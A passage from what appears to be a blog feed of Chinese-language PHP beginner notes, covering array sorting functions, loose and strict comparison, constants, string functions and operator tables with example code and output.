class="number">2</span>] =&gt; <span class="number">6</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">11</span></span><br><span class="line">    [<span class="number">4</span>] =&gt; <span class="number">22</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<h4 id="rsort-对数组降序排列"><a href="#rsort-对数组降序排列" class="headerlink" title="rsort() -对数组降序排列"></a>rsort() -对数组降序排列</h4><p>按字母排列<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$cars=<span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>);</span></span><br><span class="line"><span class="php">rsort($cars);</span></span><br><span class="line"><span class="php">print_r($cars);</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; Volvo</span><br><span class="line">    [<span class="number">1</span>] =&gt; Toyota</span><br><span class="line">    [<span class="number">2</span>] =&gt; BMW</span><br><span class="line">)</span><br></pre></td></tr></table></figure><br>按字母排列类似</p>
<h4 id="asort-根据数组的值升序排列"><a href="#asort-根据数组的值升序排列" class="headerlink" title="asort -根据数组的值升序排列"></a>asort -根据数组的值升序排列</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$age=<span class="keyword">array</span>(<span class="string">"Peter"</span>=&gt;<span class="string">"35"</span>,<span class="string">"Ben"</span>=&gt;<span class="string">"37"</span>,<span class="string">"Joe"</span>=&gt;<span class="string">"43"</span>);</span></span><br><span class="line"><span class="php">asort($age);</span></span><br><span class="line"><span class="php">print_r($age);</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [Peter] =&gt; <span class="number">35</span></span><br><span class="line">    [Ben] =&gt; <span class="number">37</span></span><br><span class="line">    [Joe] =&gt; <span class="number">43</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<p>降序排列为arsort()</p>
<h4 id="ksort-根据数组的键升序排列"><a href="#ksort-根据数组的键升序排列" class="headerlink" title="ksort() -根据数组的键升序排列"></a>ksort() -根据数组的键升序排列</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$age=<span class="keyword">array</span>(<span class="string">"Peter"</span>=&gt;<span class="string">"35"</span>,<span class="string">"Ben"</span>=&gt;<span class="string">"37"</span>,<span class="string">"Joe"</span>=&gt;<span class="string">"43"</span>);</span></span><br><span class="line"><span class="php">ksort($age);</span></span><br><span class="line"><span class="php">print_r($age);</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [Ben] =&gt; <span class="number">37</span></span><br><span class="line">    [Joe] =&gt; <span class="number">43</span></span><br><span class="line">    [Peter] =&gt; <span class="number">35</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<p>降序排列为krsort()</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.PHP的判断语句与C语言很类似，在只有一句代码而不是代码块时，可以省略<code>{}</code></p>
<p>2.PHP的数组创建使用的是array()函数,而不是使用<code>[]</code></p>
<p>3.PHP中的数值数组其实ID键就是所说的下标，而关联数组类似于python中的键值对</p>
<p>4.数组的排列函数升序是sort，逆序就在sort前加一个r</p>
<p>5.遍历关联数组需要使用foreach语句，foreach 仅能够应用于数组和对象，在后面的循环中会讲到</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/6/7-基础2</title>
    <url>/2020/06/07/PHP-2020-6-7-%E5%91%A8%E6%8A%A51/</url>
    <content><![CDATA[<h1 id="类型比较"><a href="#类型比较" class="headerlink" title="类型比较"></a>类型比较</h1><p>虽然PHP是弱类型语言，但是对于变量的比较还是有一些不同</p>
<p>松散比较：使用<code>==</code>比较，只比较值，不比较类型</p>
<p>严格比较：使用<code>===</code>比较，除了比较值，也比较类型</p>
<p>例如<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">$x=<span class="string">"25"</span>;</span></span><br><span class="line"><span class="php">$y=<span class="number">25</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">var_dump($x);</span></span><br><span class="line"><span class="php">var_dump($y);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($x==$y)&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"True\n"</span>;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"False\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($x===$y)&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"True\n"</span>;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"False\n"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">string</span><span class="params">(<span class="number">2</span>)</span></span> <span class="string">"25"</span></span><br><span class="line"><span class="function"><span class="title">int</span><span class="params">(<span class="number">25</span>)</span></span></span><br><span class="line">True</span><br><span class="line">False</span><br></pre></td></tr></table></figure><br>可以看到$x是”25”是一个字符串，而$y是一个整型</p>
<p>但是在使用==时会判等，因为只比较了值而没有比较类型</p>
<p><img src="/img/PHP/周报1-0.png" alt="avatar"><br><img src="/img/PHP/周报1-1.png" alt="avatar"></p>
<h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><p>PHP5中增加了一条规则：常量被定义后，在脚本的其他任何地方都不能改变</p>
<p>常量是一个简单的标识符，该值在脚本中不能被改变</p>
<h2 id="设置常量"><a href="#设置常量" class="headerlink" title="设置常量"></a>设置常量</h2><p>设置常量使用define()函数<br><figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line">bool <span class="class"><span class="keyword">define</span> </span>( <span class="built_in">string</span> $name , mixed $value <span class="meta">[</span>, bool $case_insensitive = <span class="literal">false</span> <span class="meta">]</span> )</span><br></pre></td></tr></table></figure><br>有三个参数：<br>name:必选参数，常量名称，即标识符</p>
<p>value:必选参数，常量的值</p>
<p>case_insensitive:可选参数，如果设置为True，该常量则大小写不敏感。默认时大小写敏感的</p>
<p>例如：<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 区分大小写的常量名</span></span></span><br><span class="line"><span class="php">define(<span class="string">"GREETING"</span>, <span class="string">"欢迎访问 Runoob.com"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> GREETING;    <span class="comment">// 输出 "欢迎访问 Runoob.com"</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> greeting;   <span class="comment">// 输出 "greeting"</span></span></span><br></pre></td></tr></table></figure></p>
<p>不区分大小写：<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 不区分大小写的常量名</span></span></span><br><span class="line"><span class="php">define(<span class="string">"GREETING"</span>, <span class="string">"欢迎访问 Runoob.com"</span>, <span class="keyword">true</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> greeting;  <span class="comment">// 输出 "欢迎访问 Runoob.com"</span></span></span><br></pre></td></tr></table></figure><br>常量是全局的，常量在定义之后，默认是全局变量，可以在任意地方使用</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">define(<span class="string">"GREETING"</span>, <span class="string">"欢迎访问 Runoob.com"</span>);</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> GREETING;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">myTest();    <span class="comment">// 输出 "欢迎访问 Runoob.com"</span></span></span><br></pre></td></tr></table></figure>
<h1 id="字符串变量"><a href="#字符串变量" class="headerlink" title="字符串变量"></a>字符串变量</h1><p>字符串变量用于存储并处理文本</p>
<p>字符串变量用于包含有字符的值，在创建字符串之后，就可以进行操作了</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$txt=<span class="string">"Hello world!"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $txt;</span></span><br></pre></td></tr></table></figure>
<p>运行结果就是$txt中的值</p>
<p>PHP7的版本中，不再区分单引号和双引号，使用哪一个都可以定义字符串变量</p>
<h2 id="并置运算符"><a href="#并置运算符" class="headerlink" title="并置运算符"></a>并置运算符</h2><p>PHP中只有一个字符串运算符，就是<code>.</code>用于把两个字符串值连接起来</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$txt1=<span class="string">"Hello world!"</span>;</span></span><br><span class="line"><span class="php">$txt2=<span class="string">"What a nice day!"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $txt1 . <span class="string">" "</span> . $txt2;</span></span><br></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">Hello world! What a nice day!</span><br></pre></td></tr></table></figure></p>
<h2 id="strlen-函数"><a href="#strlen-函数" class="headerlink" title="strlen()函数"></a>strlen()函数</h2><p>看函数名字基本上就知道是返回字符串长度的函数<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> strlen(<span class="string">"Hello world!"</span>);</span></span><br></pre></td></tr></table></figure><br>运行结果就是12</p>
<p>该函数常常用在循环和其他函数中，因为确定字符串何时结束是很重要的</p>
<h2 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos()函数"></a>strpos()函数</h2><p>strpos()函数用于在字符串中查找一个字符或一段指定的文本，如果字符串中找到匹配，就会返回第一个匹配的字符位置，如果没找到就返回False</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> strpos(<span class="string">"Hello world!"</span>,<span class="string">"world"</span>);</span></span><br></pre></td></tr></table></figure>
<p>运行结果为6</p>
<p>这里为什么不是7，是因为字符串中的第一个字符是以0开始而不是1</p>
<p>完整PHP String手册参考一下<br><a href="https://www.runoob.com/php/php-ref-string.html" target="_blank" rel="noopener">https://www.runoob.com/php/php-ref-string.html</a></p>
<h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h2 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h2><div class="table-container">
<table>
<thead>
<tr>
<th>描述</th>
<th>引入方法</th>
<th>描述</th>
<th>实例</th>
<th>结果</th>
</tr>
</thead>
<tbody>
<tr>
<td>x + y</td>
<td>加</td>
<td>x 和 y 的和</td>
<td>2 + 2</td>
<td>4</td>
</tr>
<tr>
<td>x - y</td>
<td>减</td>
<td>x 和 y 的差</td>
<td>5 - 2</td>
<td>3</td>
</tr>
<tr>
<td>x * y</td>
<td>乘</td>
<td>x 和 y 的积</td>
<td>5 * 2</td>
<td>10</td>
</tr>
<tr>
<td>x / y</td>
<td>除</td>
<td>x 和 y 的商</td>
<td>15 / 5</td>
<td>3</td>
</tr>
<tr>
<td>x % y</td>
<td>模</td>
<td>x 除以 y 的余数</td>
<td>5 % 2</td>
<td>1</td>
</tr>
<tr>
<td>- x</td>
<td>取反</td>
<td>x 取反</td>
<td>$x=-2 echo -$x</td>
<td>-2</td>
</tr>
<tr>
<td>a . b</td>
<td>并置</td>
<td>连接两个字符串</td>
<td>“Hi” . “Ha”</td>
<td>HiHa</td>
</tr>
</tbody>
</table>
</div>
<p>例如：<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x=<span class="number">10</span>;</span></span><br><span class="line"><span class="php">$y=<span class="number">6</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> ($x + $y); <span class="comment">// 输出16</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;  <span class="comment">// 换行</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> ($x - $y); <span class="comment">// 输出4</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;  <span class="comment">// 换行</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> ($x * $y); <span class="comment">// 输出60</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;  <span class="comment">// 换行</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> ($x / $y); <span class="comment">// 输出1.6666666666667</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;  <span class="comment">// 换行</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> ($x % $y); <span class="comment">// 输出4</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;  <span class="comment">// 换行</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> -$x;</span></span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">16</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">60</span></span><br><span class="line"><span class="number">1.6666666666667</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">-10</span></span><br></pre></td></tr></table></figure><br>PHP7+之后增加了整除运算符intdiv()<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(<span class="built_in">int</span>div(<span class="number">10</span>, <span class="number">3</span>));</span><br></pre></td></tr></table></figure><br>运行结果:<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">int</span><span class="params">(<span class="number">3</span>)</span></span></span><br></pre></td></tr></table></figure></p>
<h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><div class="table-container">
<table>
<thead>
<tr>
<th>运算符</th>
<th>等同于</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>x=y</td>
<td>x=y</td>
<td>左操作数被设置为右侧表达式的值</td>
</tr>
<tr>
<td>x+=y</td>
<td>x=x+y</td>
<td>加</td>
</tr>
<tr>
<td>x-=y</td>
<td>x=x-y</td>
<td>减</td>
</tr>
<tr>
<td>x*=y</td>
<td>x=x*y</td>
<td>乘</td>
</tr>
<tr>
<td>x/=y</td>
<td>x=x/y</td>
<td>除</td>
</tr>
<tr>
<td>x%=y</td>
<td>x=x%y</td>
<td>模</td>
</tr>
<tr>
<td>a.=b</td>
<td>a=a.b</td>
<td>连接两个字符串</td>
</tr>
</tbody>
</table>
</div>
<p>例如：<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x=<span class="number">10</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $x; <span class="comment">// 输出10</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$y=<span class="number">20</span>;</span></span><br><span class="line"><span class="php">$y += <span class="number">100</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $y; <span class="comment">// 输出120</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$z=<span class="number">50</span>;</span></span><br><span class="line"><span class="php">$z -= <span class="number">25</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $z; <span class="comment">// 输出25</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$i=<span class="number">5</span>;</span></span><br><span class="line"><span class="php">$i *= <span class="number">6</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $i; <span class="comment">// 输出30</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$j=<span class="number">10</span>;</span></span><br><span class="line"><span class="php">$j /= <span class="number">5</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $j; <span class="comment">// 输出2</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$k=<span class="number">15</span>;</span></span><br><span class="line"><span class="php">$k %= <span class="number">4</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $k; <span class="comment">// 输出3</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">120</span></span><br><span class="line"><span class="number">25</span></span><br><span class="line"><span class="number">30</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure></p>
<h2 id="递增-递减运算符"><a href="#递增-递减运算符" class="headerlink" title="递增/递减运算符"></a>递增/递减运算符</h2><div class="table-container">
<table>
<thead>
<tr>
<th>运算符</th>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>++x</td>
<td>预递增</td>
<td>x加1，然后返回x</td>
</tr>
<tr>
<td>x++</td>
<td>后递增</td>
<td>返回x，然后x加1</td>
</tr>
<tr>
<td>—x</td>
<td>预递减</td>
<td>x减1，然后返回x</td>
</tr>
<tr>
<td>x—</td>
<td>后递减</td>
<td>返回x，然后x减1</td>
</tr>
</tbody>
</table>
</div>
<p>例如：<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x=<span class="number">10</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> ++$x; <span class="comment">// 输出11</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$y=<span class="number">10</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $y++; <span class="comment">// 输出10</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$z=<span class="number">5</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> --$z; <span class="comment">// 输出4</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$i=<span class="number">5</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $i--; <span class="comment">// 输出5</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br></pre></td></tr></table></figure><br>运行结果:<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">11</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure></p>
<h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><div class="table-container">
<table>
<thead>
<tr>
<th>运算符</th>
<th>名称</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody>
<tr>
<td>x==y</td>
<td>等于</td>
<td>如果x等于y，则返回true</td>
<td>5==8返回false</td>
</tr>
<tr>
<td>x===y</td>
<td>绝对等于</td>
<td>如果x等于y，且它们类型相同，则返回true</td>
<td>5===”5”返回false</td>
</tr>
<tr>
<td>x!=y</td>
<td>不等于</td>
<td>如果x不等于y，则返回true</td>
<td>5!=8返回true</td>
</tr>
<tr>
<td>x&lt;&gt;y</td>
<td>不等于</td>
<td>如果x不等于y，则返回true</td>
<td>5&lt;&gt;8返回true</td>
</tr>
<tr>
<td>x!==y</td>
<td>绝对不等于</td>
<td>如果x不等于y，或它们类型不相同，则返回true</td>
<td>5!==”5”返回true</td>
</tr>
<tr>
<td>x&gt;y</td>
<td>大于</td>
<td>如果x大于y，则返回true</td>
<td>5&gt;8返回false</td>
</tr>
<tr>
<td>x&lt;y</td>
<td>小于</td>
<td>如果x小于y，则返回true</td>
<td>5&lt;8返回true</td>
</tr>
<tr>
<td>x&gt;=y</td>
<td>大于等于</td>
<td>如果x大于或者等于y，则返回true</td>
<td>5&gt;=8返回false</td>
</tr>
<tr>
<td>x&lt;=y</td>
<td>小于等于</td>
<td>如果x小于或者等于y，则返回true</td>
<td>5&lt;=8返回true</td>
</tr>
</tbody>
</table>
</div>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta"><span class="meta-keyword">$x</span>=100;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$y</span>="100";</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="symbol">$</span>x == <span class="symbol">$</span>y);</span><br><span class="line"></span><br><span class="line">var_dump(<span class="symbol">$</span>x === <span class="symbol">$</span>y);</span><br><span class="line"></span><br><span class="line">var_dump(<span class="symbol">$</span>x != <span class="symbol">$</span>y);</span><br><span class="line"></span><br><span class="line">var_dump(<span class="symbol">$</span>x !== <span class="symbol">$</span>y);</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">$a</span>=50;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$b</span>=90;</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="symbol">$</span>a &gt; <span class="symbol">$</span>b);</span><br><span class="line"></span><br><span class="line">var_dump(<span class="symbol">$</span>a &lt; <span class="symbol">$</span>b);</span><br></pre></td></tr></table></figure>
<p>运行结果:<br><figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">bool</span>(<span class="variable"><span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"><span class="title">bool</span>(<span class="variable"><span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"><span class="title">bool</span>(<span class="variable"><span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"><span class="title">bool</span>(<span class="variable"><span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"><span class="title">bool</span>(<span class="variable"><span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"><span class="title">bool</span>(<span class="variable"><span class="literal">true</span></span>)</span></span><br></pre></td></tr></table></figure></p>
<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><div class="table-container">
<table>
<thead>
<tr>
<th>运算符</th>
<th>名称</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody>
<tr>
<td>x and y</td>
<td>与</td>
<td>如果x和y都为true，则返回true</td>
<td>x=6 y=3 (x<10 and y>1)返回true</td>
</tr>
<tr>
<td>x or y</td>
<td>或</td>
<td>如果x和y至少有一个为true，则返回true</td>
<td>x=6 y=3 (x==6 or y==5)返回true</td>
</tr>
<tr>
<td>x xor y</td>
<td>异或</td>
<td>如果x和y有且仅有一个为true，则返回true</td>
<td>x=6 y=3 (x==6 xor y==3)返回false</td>
</tr>
<tr>
<td>x &amp;&amp; y</td>
<td>与</td>
<td>如果x和y都为true，则返回true</td>
<td>x=6 y=3 (x<10 && y>1)返回true</td>
</tr>
<tr>
<td>!x</td>
<td>非</td>
<td>如果x不为true，则返回true</td>
<td>x=6 y=3 !(x==y)返回true</td>
</tr>
</tbody>
</table>
</div>
<h2 id="数组运算符"><a href="#数组运算符" class="headerlink" title="数组运算符"></a>数组运算符</h2><div class="table-container">
<table>
<thead>
<tr>
<th>运算符</th>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>x+y</td>
<td>集合</td>
<td>x和y的集合</td>
</tr>
<tr>
<td>x==y</td>
<td>相等</td>
<td>如果x和y具有相同的键/值对，则返回true</td>
</tr>
<tr>
<td>x===y</td>
<td>恒等</td>
<td>如果x和y具有相同的键/值对，且顺序相同类型相同，则返回true</td>
</tr>
<tr>
<td>x!=y</td>
<td>不相等</td>
<td>如果x不等于y，则返回true</td>
</tr>
<tr>
<td>x&lt;&gt;y</td>
<td>不相等</td>
<td>如果x不等于y，则返回true</td>
</tr>
<tr>
<td>x!==y</td>
<td>不恒等</td>
<td>如果x不等于y，则返回true</td>
</tr>
</tbody>
</table>
</div>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x = <span class="keyword">array</span>(<span class="string">"a"</span> =&gt; <span class="string">"red"</span>, <span class="string">"b"</span> =&gt; <span class="string">"green"</span>);</span></span><br><span class="line"><span class="php">$y = <span class="keyword">array</span>(<span class="string">"c"</span> =&gt; <span class="string">"blue"</span>, <span class="string">"d"</span> =&gt; <span class="string">"yellow"</span>);</span></span><br><span class="line"><span class="php">$z = $x + $y; <span class="comment">// $x 和 $y 数组合并</span></span></span><br><span class="line"><span class="php">var_dump($z);</span></span><br><span class="line"><span class="php">var_dump($x == $y);</span></span><br><span class="line"><span class="php">var_dump($x === $y);</span></span><br><span class="line"><span class="php">var_dump($x != $y);</span></span><br><span class="line"><span class="php">var_dump($x &lt;&gt; $y);</span></span><br><span class="line"><span class="php">var_dump($x !== $y);</span></span><br></pre></td></tr></table></figure>
<p>运行结果:<br><figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line"><span class="built_in">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">  [<span class="string">"a"</span>]=&gt;</span><br><span class="line">  <span class="built_in">string</span>(<span class="number">3</span>) <span class="string">"red"</span></span><br><span class="line">  [<span class="string">"b"</span>]=&gt;</span><br><span class="line">  <span class="built_in">string</span>(<span class="number">5</span>) <span class="string">"green"</span></span><br><span class="line">  [<span class="string">"c"</span>]=&gt;</span><br><span class="line">  <span class="built_in">string</span>(<span class="number">4</span>) <span class="string">"blue"</span></span><br><span class="line">  [<span class="string">"d"</span>]=&gt;</span><br><span class="line">  <span class="built_in">string</span>(<span class="number">6</span>) <span class="string">"yellow"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">bool</span>(<span class="literal">false</span>)</span><br><span class="line"><span class="built_in">bool</span>(<span class="literal">false</span>)</span><br><span class="line"><span class="built_in">bool</span>(<span class="literal">true</span>)</span><br><span class="line"><span class="built_in">bool</span>(<span class="literal">true</span>)</span><br><span class="line"><span class="built_in">bool</span>(<span class="literal">true</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h2><p>另一个条件运算符是”?:”（或三元）运算符</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="comment">(expr1)</span> ? <span class="comment">(expr2)</span> : <span class="comment">(expr3)</span></span><br></pre></td></tr></table></figure>
<p>expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$test = <span class="string">'菜鸟教程'</span>;</span></span><br><span class="line"><span class="php"><span class="comment">// 普通写法</span></span></span><br><span class="line"><span class="php">$username = <span class="keyword">isset</span>($test) ? $test : <span class="string">'nobody'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $username, PHP_EOL;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// PHP 5.3+ 版本写法</span></span></span><br><span class="line"><span class="php">$username = $test ?: <span class="string">'nobody'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $username, PHP_EOL;</span></span><br></pre></td></tr></table></figure>
<p>运行结果:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">菜鸟教程</span><br><span class="line">菜鸟教程</span><br></pre></td></tr></table></figure><br>注意：PHP_EOL 是一个换行符，兼容更大平台</p>
